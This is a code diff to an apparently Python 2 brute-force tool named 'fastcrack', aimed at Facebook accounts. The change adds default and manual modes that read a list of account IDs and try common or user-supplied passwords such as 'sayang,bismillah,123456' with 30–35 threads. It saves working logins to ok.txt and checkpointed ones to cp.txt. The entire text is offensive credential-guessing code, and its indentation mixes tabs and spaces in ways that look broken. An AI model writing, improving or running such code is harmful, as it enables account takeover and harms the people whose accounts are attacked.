@@ -467,33 +467,75 @@ def logs():
     logs()
 
 class fastcrack:
-	os.system("clear")
+        os.system("clear")
         banner()
-	try:
+	def __init__(self):
+		self.ada=[]
+		self.cp=[]
+		self.ko=0
+		print("\n   [•] Crack With Pass Default/Manual [d/m]")
 		while True:
-			try:
-				self.apk=raw_input("\n   [•] ID List File : ")
-				self.fs=open(self.apk).read().splitlines()
+			f=raw_input("   [•] Choose : ")
+			if f=="":continue
+			elif f=="m":
+				try:
+					while True:
+						try:
+							self.apk=raw_input("   [•] ID List File : ")
+							self.fs=open(self.apk).read().splitlines()
+							break
+						except Exception as e:
+							print ("   %s"%e)
+							continue
+					self.fl=[]
+					for i in self.fs:
+						try:
+							self.fl.append({"id":i.split("<=>")[0]})
+						except:continue
+				except Exception as e:
+					print ("   %s"%e)
+					continue
+				print ("   [•] Example : sayang,bismillah,123456")
+				self.pwlist1()
 				break
-			except Exception as e:
-				print ("   %s"%e)
-				continue
-		self.fl=[]
-		for i in self.fs:
-			try:
-				self.fl.append({"id":i.split("<=>")[0],"pw":gene(i.split("<=>")[1])})
-			except:continue
-	except Exception as e:
-		print ("   %s"%e)
-	print ("   [•] Crack Started...")
-	print ("   [•] Account [OK] Saved to : ok.txt")
-	print ("   [•] Account [CP] Saved to : cp.txt\n")
-	ThreadPool(35).map(self.main1,self.fl)
-	os.remove(self.apk)
-	print("\n\x1b[0;37m   [•] Finished")
-	break
-			
-def main1(self,fl):
+			elif f=="d":
+				try:
+					while True:
+						try:
+							self.apk=raw_input("   [•] ID List File : ")
+							self.fs=open(self.apk).read().splitlines()
+							break
+						except Exception as e:
+							print ("   %s"%e)
+							continue
+					self.fl=[]
+					for i in self.fs:
+						try:
+							self.fl.append({"id":i.split("<=>")[0],"pw":gene(i.split("<=>")[1])})
+						except:continue
+				except Exception as e:
+					print ("   %s"%e)
+				print ("\n   [•] Crack Started...")
+				print ("   [•] Account [OK] Saved to : ok.txt")
+				print ("   [•] Account [CP] Saved to : cp.txt\n")
+				ThreadPool(35).map(self.main1,self.fl)
+				os.remove(self.apk)
+				print("\n\x1b[0;37m   [•] Finished")
+				break
+	def pwlist1(self):
+		self.pw=raw_input("   [•] Password List : ").split(",")
+		if len(self.pw) ==0:
+			self.pwlist()
+		else:
+			for i in self.fl:
+				i.update({"pw":self.pw})
+			print ("\n   [•] Crack Started...")
+			print ("   [•] Account [OK] Saved to : ok.txt")
+			print ("   [•] Account [CP] Saved to : cp.txt\n")
+			ThreadPool(30).map(self.main1,self.fl)
+			os.remove(self.apk)
+			print("\n\x1b[0;37m   [•] Finished")
+	def main1(self,fl):
 		try:
 			for i in fl.get("pw"):
 				log=touch_fb(fl.get("id"),
